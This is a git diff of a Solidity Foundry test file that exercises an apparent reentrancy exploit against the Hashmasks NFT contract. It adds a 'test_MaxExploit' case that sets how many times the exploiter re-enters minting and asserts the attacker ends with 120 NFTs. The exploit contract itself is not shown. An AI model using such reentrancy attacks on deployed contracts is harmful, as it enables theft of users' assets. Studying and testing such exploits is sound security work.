@@ -30,7 +30,7 @@ contract ExploiterTest is PRBTest, StdCheats {
         users = utils.createUsers(2);
         bob = users[0];
         vm.label(bob, "Bob");
-        vm.deal(bob, 12 ether);
+        vm.deal(bob, 50 ether);
         alice = users[1];
         vm.label(alice, "Alice");
         vm.deal(alice, 12 ether);
@@ -76,5 +76,20 @@ contract ExploiterTest is PRBTest, StdCheats {
         exploiter.exploit{value: 12 ether}();
         assertEq(0, hashmasks.balanceOf(bob));
         assertEq(0, hashmasks.totalSupply());
+    }
+
+    /** Max exploit, we should be able to re-enter maxTimes = maxSupply - maxMint (20) - alreadyMinted */
+    function test_MaxExploit() external {
+        uint maxSupply = hashmasks.MAX_NFT_SUPPLY();
+        uint alreadyMinted = hashmasks.totalSupply();
+        // subtract 20 since that's the max single mint we are going to mint each time
+        // the max single mint is taken from below where maxMint = numberOfNfts
+        // `require(totalSupply + numberOfNfts <= MAX_NFT_SUPPLY, "Exceeds MAX_NFT_SUPPLY");`
+        uint maxMint = 20;
+        exploiter.setMaxTimes(uint8(maxSupply - maxMint - alreadyMinted));
+        vm.startPrank(bob);
+        exploiter.exploit{value: 12 ether}();
+        assertEq(120, hashmasks.balanceOf(bob));
+        assertEq(120, hashmasks.totalSupply());
     }
 }
